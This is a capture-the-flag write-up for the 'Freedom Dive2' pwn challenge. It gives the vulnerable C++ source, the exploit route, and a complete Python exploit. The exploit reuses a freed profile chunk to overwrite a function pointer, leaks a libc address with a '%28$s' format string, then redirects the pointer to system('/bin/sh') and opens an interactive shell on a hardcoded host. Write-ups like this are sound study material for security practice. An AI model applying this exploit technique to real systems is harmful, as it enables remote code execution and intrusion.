## [Pwn] Freedom Dive2 (300)

**freedom_dive2.cpp**
```c++
// Mitigation : ASLR, NX, SSP
// compile : g++ -fstack-protector-all --param ssp-buffer-size=4 -o freedom_dive2 freedom_dive2.cpp -m32

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

typedef class userProfile {
public:
	char username[36];
	char comment[216];
	void (*cleanMemory)(void *);
	void init(){
		cleanMemory = free;
	}
} Profile;

void welcome();
void echoService();
void displayMenu();
void setProfile(Profile *);
void showProfile(Profile *);
void modifyProfile(Profile *);
void deleteProfile(Profile *);
void quit(Profile *);

int flag;

int main(int argc, char *argv[])
{
	setvbuf(stdout, 0, 2, 0);
	char name[12] = {0,};
	puts("[*] Please input your name");
	read(0, name, 10);
	welcome();
	flag = 0;
	Profile *p;
	unsigned int sel;
	while(true)
	{
		displayMenu();
		scanf("%d", &sel);
		switch(sel){
			case 0:
				echoService();
				break;
			case 1:
				if(flag == 0) p = (Profile *)malloc(256);
				setProfile(p);
				break;
			case 2:
				if(flag == 0){
					printf("[*] Please set the profile first!!\n");
					break;
				}
				showProfile(p);
				break;
			case 3:
				if(flag == 0){
					printf("[*] Please set the profile first!!\n");
					break;
				}
				modifyProfile(p);
				break;
			case 4:
				if(flag == 0){
					printf("[*] Please set the profile first!!\n");
					break;
				}
				deleteProfile(p);
				break;
			case 5:
				quit(p);
				break;
			default:
				printf("[*] No such command!!\n");
				break;
		}
	}
}

void welcome(){
	puts("\n   ============== Comment Service ==============");
	puts("   Welcome to my comment service!");
	puts("   It's wonderful service, but incompleted :(");
	puts("   So, It allows you use only one account.");
	puts("   Please be fun with my service!");
	puts("   =============================================\n");
}

void echoService(){
	char *echoMessage = (char *)malloc(256);
	printf("[*] Input Message : ");
	read(0, echoMessage, 256);
	printf("[*] Echo : %s\n", echoMessage);
	free(echoMessage);
}

void displayMenu(){
	puts("========== Menu ==========");
	puts("0. Echo service");
	puts("1. Set Profile");
	puts("2. Show Profile");
	puts("3. Modify Profile");
	puts("4. Delete Profile");
	puts("5. Exit");
	printf("Select menu : ");
}

void setProfile(Profile *pro){
	pro->init();
	printf("[*] Input Name : ");
	read(0, pro->username, 36);
	printf("[*] Input Description : ");
	read(0, pro->comment, 216);
	flag++;
}

void showProfile(Profile *pro){
	printf("username : %s\n", pro->username);
	printf("comment : %s\n", pro->comment);
}

void modifyProfile(Profile *pro){
	int num;
	showProfile(pro);
	puts("============================");
	printf("[*] Input name : ");
	num = read(0, pro->username, 36);
	pro->username[num] = '\0';
	printf("[*] Input Description : ");
	num = read(0, pro->comment, 216);
	pro->comment[num] = '\0';
	puts("============================");
}

void deleteProfile(Profile *pro){
	pro->cleanMemory(pro);
	flag--;
}

void quit(Profile *pro){
	exit(0);
}
```

It patched the **free()** function pointer in **Profile** to show **glt address**, not library address.
So, you should find the leak vulnerability again, but it's easy again.
Unlike previous challenge, freedom_dive2 uses **printf()** function.
So you can overwrite function pointer with **printf** after put the **formatstring** into echo message.
You can leak the library address of certain function using formatstring and variable **name** in **main** function.
After then, exploit it like **Freedom Dive**.

So, Exploit route is as follows.
`Menu 1 => Menu 1 => Menu 4 => Menu 0 => Overwrite Pointer => Menu 2 (FSB, Leak) => Menu 1 => Menu 1 => Menu 4 => Menu 0 => Overwrite Pointer => Menu 4 (Trigger)`

Exploit code is as follows.
```python
from hackutil import *
from socket import *
from time import *
from telnetlib import *

# =================================
HOST = '45.55.163.13'
PORT = 9001
printf_plt = 0x08048590
read_got = 0x0804A3A4
offset_read_system = 0xDBEB0 - 0x3E3E0
offset_read_binsh = 0xDBEB0 - 0x15F771
# =================================

def generate_formatstring(start, str_length):
	ret = ""
	for i in range(start, start+100):
		if (len(ret)+7) > str_length:
			break
		ret += "%%%02d$8x " % (i)
	ret += (" " * (str_length - len(ret)))
	return ret


sock = socket(AF_INET, SOCK_STREAM)
sock.connect((HOST, PORT))

sleep(0.5)
sock.recv(1024)
sock.send(p32(read_got))
sock.recv(1024)

for i in range(2):
	sock.send('1\n')
	sleep(0.1)
	sock.recv(1024)

	sock.send('5kyc1ad_Dummy')
	sleep(0.1)
	sock.recv(1024)

	sock.send('Dummy')
	sleep(0.1)
	sock.recv(1024)

sleep(0.5)

sock.recv(1024)

sock.send('4\n')
sleep(0.1)
sock.recv(1024)

sock.send('0\n')
sleep(0.1)
sock.recv(1024)
#sock.send(generate_formatstring(28, 252) + p32(printf_plt)) #Find name buffer at %28$08x
sock.send("%28$s" + 'A'*247 + p32(printf_plt))
sleep(0.1)
sock.recv(2048)
sleep(0.1)

sock.send('4\n')
sleep(0.5)
data = sock.recv(1024)
data = sock.recv(1024)
read_lib = up32(data[:4])[0]
print "[*] Find read@lib : " + str(hex(read_lib))
system_lib = read_lib - offset_read_system
print "[*] Find system@lib : " + str(hex(system_lib))

raw_input()

# Vuln Again
for i in range(2):
	sock.send('1\n')
	sleep(0.1)
	sock.recv(1024)

	sock.send('5kyc1ad_Dummy')
	sleep(0.1)
	sock.recv(1024)

	sock.send('Dummy')
	sleep(0.1)
	sock.recv(1024)

sock.send('4\n')
sleep(0.1)
sock.recv(1024)

sock.send('0\n')
sleep(0.1)
sock.recv(1024)

sock.send('/bin/sh\x00' + 'A'*244 + p32(system_lib))
sleep(0.1)
sock.recv(1024)

sock.send('4\n')

t = Telnet()
t.sock = sock
t.interact()
```